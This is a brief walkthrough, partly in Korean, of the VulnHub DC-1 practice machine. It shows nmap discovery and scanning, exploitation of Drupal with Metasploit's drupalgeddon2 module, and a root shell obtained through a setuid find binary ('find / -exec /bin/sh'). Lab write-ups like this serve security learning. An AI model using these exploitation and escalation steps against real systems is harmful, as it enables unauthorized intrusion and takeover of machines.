[DC-1](https://www.vulnhub.com/entry/dc-1-1,292/#download)

# targetdiscovery
***
### nmap -sn 192.168.25.8-255 --open   
![1](https://user-images.githubusercontent.com/69203345/110197326-397ed000-7e8e-11eb-81b3-449f9e187396.PNG)

# enumerate + exploitation
***
## target: 192.168.25.10
### nmap -O -sV -sS -p- 192.168.25.10
![2](https://user-images.githubusercontent.com/69203345/110197356-72b74000-7e8e-11eb-8285-43a89875ffa8.PNG)    
#### 192.168.25.10
![3](https://user-images.githubusercontent.com/69203345/110197489-2f110600-7e8f-11eb-858c-b7656c2c4fa2.PNG)

#### msfconsole
#### search drupal
drupal_drupalgeddon2 사용함    
![4](https://user-images.githubusercontent.com/69203345/110197528-6e3f5700-7e8f-11eb-96f4-4e837ba10c72.PNG)    
rhost 설정후 run    
![5](https://user-images.githubusercontent.com/69203345/110197583-dc841980-7e8f-11eb-9024-c71a8d5eff4d.PNG)      
find 명령어에 setuid 가 설정되있음 -> find명령어를 실행할때는 누구나 root 가 됨 -> find명령어로 쉘 실행시 루트쉘을 얻음     

# privilege escalation 
***   
### find / -exec /bin/sh \;
![6](https://user-images.githubusercontent.com/69203345/110197781-3e914e80-7e91-11eb-8a7e-28e0982242be.PNG)      
root계정으로 들어와있는거 볼수 있음    

root획득   
꼭 이방법만 있는것은 아니다.
으악.
***
